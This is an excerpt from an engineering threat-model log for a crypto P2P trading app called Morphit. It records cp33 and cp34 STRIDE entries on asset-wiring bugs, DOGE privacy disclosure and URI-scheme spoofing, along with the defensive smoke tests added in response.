**T-cp33-1 (LOW).**  Ken-supplied DOGE icon SVG is 53,842 bytes
(13× cp32-conservative per-icon ceiling).  Bypassing the ceiling
without justification would be a tampering vector — future
contributors could justify any icon-bloat by pointing at the
DOGE precedent.  Mitigation: cp33 raises per-asset-icon ceiling
to 64 KB (from 4 KB) and total budget to 128 KB (from 32 KB)
with DOCUMENTED RATIONALE in both ADR-0030 §8 and the smoke
source comments — the raise is explicitly framed as "bloat-by-
design for canonical brand artwork, not policy".  Network icons
keep tighter 4 KB caps because they don't need detailed
illustration.  The smoke is the trip-wire; the ADR is the why.

**T-cp33-2 (MEDIUM).**  Five HIGH-severity preexisting bugs
silently shipping in production (CODE-3 DAI wire-format gates
broken since cp31, CODE-4 indexer-client mirror missing LTC+DASH
since cp24+cp27, CODE-5 DAI placeholder dispatch broken since
cp31, CODE-6 type-union narrowing missing DAI since cp31,
CODE-7 FAQ asset enumerations stale across 10 locales) all
shared a common mechanism: the canonical type union or wire-
format declaration WAS extended, but a SIBLING file using a
narrower hand-written union or duplicated comment WAS NOT.
This is the structural tampering surface — silent drift between
canonical and sibling.  Mitigation already partial via existing
wiring-completeness CHECK rows and the cp32 LL #36 invariant
SAME-TURN discipline.  Stronger mitigation FILED AS REVISIT:
add a smoke that finds every narrow-method-union-literal in
.svelte/.ts and asserts each matches the canonical
ChatAssetTicker order.

### Repudiation — 0 rows

No repudiation surface in cp33.

### Information Disclosure — 1 row

**I-cp33-1 (LOW).**  DOGE has NO native privacy upgrade (no
PrivateSend equivalent, no confidential transactions, no
segwit-enabled mixing).  A naive user sharing the same DOGE
address across multiple Morphit trades builds a public on-chain
fingerprint of their P2P activity.  Mitigation: privacy guide
copy in `privacy.guides.doge` × 10 locales tells users to use a
fresh HD-derived address per trade; the FAQ `what_is_doge`
states this plainly without spin.  This is honest disclosure
per Memory #29 — DOGE's posture is what it is.  Strongest
privacy path remains XMR.

### Denial of Service — 1 row

**D-cp33-1 (LOW).**  Memorability of `dogecoin:` URI scheme
(versus `bitcoin:`, `litecoin:`, `dash:`).  A malicious link in
chat could substitute a near-misspelling (`d0gecoin:`,
`dogecoinurl:`) to defeat wallet handling and produce a click-
that-goes-nowhere.  Mitigation: `buildPaymentUri` controls the
emission side (always `dogecoin:` lowercase), and the chat
payload decoder requires the address to validate against
DOGE's regex before rendering a clickable URI.  Attacker
cannot inject arbitrary URI schemes through the wire payload
unless they also produce a valid DOGE address shape.

### Elevation of Privilege — 0 rows

No EoP surface in cp33.

### Summary

| Category | New rows | Pre-existing rows still in force |
|----------|----------|----------------------------------|
| Spoofing | 1 (S-cp33-1) | S-cp32-* + S-cp31-* + S-cp30-* + S1-S7 |
| Tampering | 2 (T-cp33-1, T-cp33-2) | T-cp32-* + T-cp31-* + T-cp30-* + T1-T7 |
| Repudiation | 0 | R-cp31-1 + R-cp30-1 + R1-R4 |
| Information disclosure | 1 (I-cp33-1) | I-cp32-* + I-cp31-* + I-cp30-* + I1-I8 |
| Denial of service | 1 (D-cp33-1) | D-cp32-* + D-cp31-* + D-cp30-* + D1-D7 |
| Elevation of privilege | 0 | E-cp31-* + E-cp30-* + E1-E4 |

**Net new threats:** 5 across 4 categories.  No criticals.

**Highest-impact lesson (T-cp33-2):**  The 5 preexisting HIGH-
severity bugs surfaced by the cp33 deep-deep all share the same
SIBLING-FILE-DRIFT mechanism.  The structural mitigation is
strengthening the "same-turn discipline" lessons LL #35/#36/#37
from cp32 with mechanical enforcement (a new smoke or extension
of an existing one) for narrow-union-literal parity.  This is
the cp33 LL #38 candidate.

---

## CP34 STRIDE refresh (2026-05-19)

Cp34 scope: 94-task deep-deep on cp33 work itself — meta-audit
testing whether cp33's own deep-deep introduced or missed
sibling-file drift.  Per cp33 LL #38 (asset-addition deep-deep
must walk SIBLING files of every touched-file) — cp34 applies
LL #38 to cp33's own work and finds the answer is "no, cp33's
deep-deep missed the sibling-file pattern in 6+ places."

### Spoofing — 0 rows
No new spoofing surface in cp34.

### Tampering — 2 rows

**T-cp34-1 (CRITICAL → demoted to LOW post-closure).**  Per-asset
network discriminator wiring class — cp31 added DAI to the
canonical registry, payment-method registry, chat surfaces,
indexer order/replace handlers, indexer-client mirror, and 10
locales of i18n + privacy guides.  cp31 ALSO added a
`DaiNetworkPicker.svelte` component.  But the post page
(`apps/web/src/routes/[lang]/post/+page.svelte`) was MISSED:
no daiNetwork state variable, no canSubmit gate for DAI,
no DaiNetworkPicker mount, no asset-change reset, no
assetNetwork dispatch.  Result: **DAI order posting was end-to-
end broken cp31→cp34** — the form let users post DAI orders
that arrived at the indexer without an `asset_network` field,
which the indexer rejected with `'asset_network_required_for_dai'`.
The user-facing UX was "click Post Order, see generic error,
have no idea why."  **None of cp31's deep-deep, cp32's deep-
deep, or cp33's deep-deep caught this** — all three audits
focused on the component-files-changed-this-cp, not on the
unchanged-but-now-incomplete sibling pages.  CP34 LL #41:
"asset-addition deep-deep must walk SIBLING ROUTES too, not
just sibling files."  Mitigation shipped: wiring-completeness
CHECK row `cp34-i1-dai-post-page-wired` pins
`<DaiNetworkPicker` in the post-page source forever.

**T-cp34-2 (LOW).**  Same class as T-cp34-1 but smaller blast
radius: the orderbook page never rendered network chips for
USDC orders (cp30) or DAI orders (cp31).  USDC-ERC-20 and
USDC-Solana looked visually identical on the orderbook list
even though their address shapes are completely different;
DAI-ERC-20 / DAI-Polygon / DAI-Base / DAI-Arbitrum all share
the EVM 0x format and were indistinguishable.  Bug class is
"discoverability friction" not "functionally broken" — buyers
could still click into the order detail to see the network —
but on the listing this is the worst cross-network-confusion
surface in the app for DAI.  Mitigation shipped:
wiring-completeness CHECK row `cp34-i3-orderbook-dai-chip-rendered`
pins `daiRowNetwork` derivation in the orderbook page.

### Repudiation — 0 rows
No repudiation surface in cp34.

### Information Disclosure — 1 row

**I-cp34-1 (LOW).**  The cheat-sheet page rendered an asset-
roster table missing DAI (cp31) and DOGE (cp33).  Information
disclosure direction: the page UNDER-disclosed — users
expecting a complete asset reference got an incomplete one,
potentially missing that DAI/DOGE are supported and concluding
"this platform doesn't trade those."  Closure: H-1.  Future
mitigation already in place — wiring-completeness CHECK row
`cp34-h1-cheat-sheet-doge-rendered`.

### Denial of Service — 0 rows
No DoS surface in cp34.

### Elevation of Privilege — 0 rows
No EoP surface in cp34.

### Summary

| Category | New rows | Pre-existing rows still in force |
|----------|----------|----------------------------------|
| Spoofing | 0 | S-cp33-1 + S-cp32-* + S-cp31-* + S-cp30-* + S1-S7 |
| Tampering | 2 (T-cp34-1, T-cp34-2) | T-cp33-* + T-cp32-* + T-cp31-* + T-cp30-* + T1-T7 |
| Repudiation | 0 | R-cp31-1 + R-cp30-1 + R1-R4 |
| Information disclosure | 1 (I-cp34-1) | I-cp33-1 + I-cp32-* + I-cp31-* + I-cp30-* + I1-I8 |
| Denial of service | 0 | D-cp33-1 + D-cp32-* + D-cp31-* + D-cp30-* + D1-D7 |
| Elevation of privilege | 0 | E-cp31-* + E-cp30-* + E1-E4 |

**Net new threats:** 3 across 2 categories.  One CRITICAL
(T-cp34-1) demoted to LOW post-closure — the production-impact
of a broken DAI form during the cp31→cp34 window is zero
because Morphit is pre-launch (Memory #6).

**Highest-impact lesson (T-cp34-1):**  Cp33 LL #38 said "walk
SIBLING FILES."  Cp34 strengthens it to "walk SIBLING ROUTES
too" — sibling routes that depend on a multi-network asset's
infrastructure but weren't touched by the asset-addition turn
remain at high risk for missed wiring.  Mitigation shipped:
new defensive smoke
`apps/web/scripts/chat-asset-ticker-narrow-union-parity-smoke.ts`
mechanically enforces canonical ChatAssetTicker coverage across
all narrow unions in apps/web/src — with a documented
NARROW_BY_DESIGN allow-list for intentionally narrow surfaces
(fee_method, listing-fee panel, single-network explorer
template targets, non-BLURT chat-mark-sent).

### CP34 LL #41-43 candidates (for AUDIT-2026-05.md cp34 entry)

- **LL #41**: Asset-addition deep-deep must walk SIBLING ROUTES
  too, not just sibling files.  Routes that mount components
  depending on multi-network asset infrastructure may need
  picker/state/gate/reset additions in the route file itself.
- **LL #42**: Wiring-completeness CHECK rows must anchor on
  exact strings appearing in the brag list.  Smoke-vs-brag
  phrase drift (cp34 J-1) is a silent regression of the smoke,
  not of the production code.  Brag list edits MUST grep the
  wiring-completeness smoke source for the changed phrase and
  update the CHECK row in the same turn.
- **LL #43**: A defensive smoke is best built immediately after
  closing the bug class it would have caught.  CP34's new
  chat-asset-ticker-narrow-union-parity-smoke would have
  caught cp33 CODE-6 (4 narrow type-union sites missing DAI).
  Building it AT cp34 rather than at cp33+1 means future
  asset additions can never regress the cp33 closure.
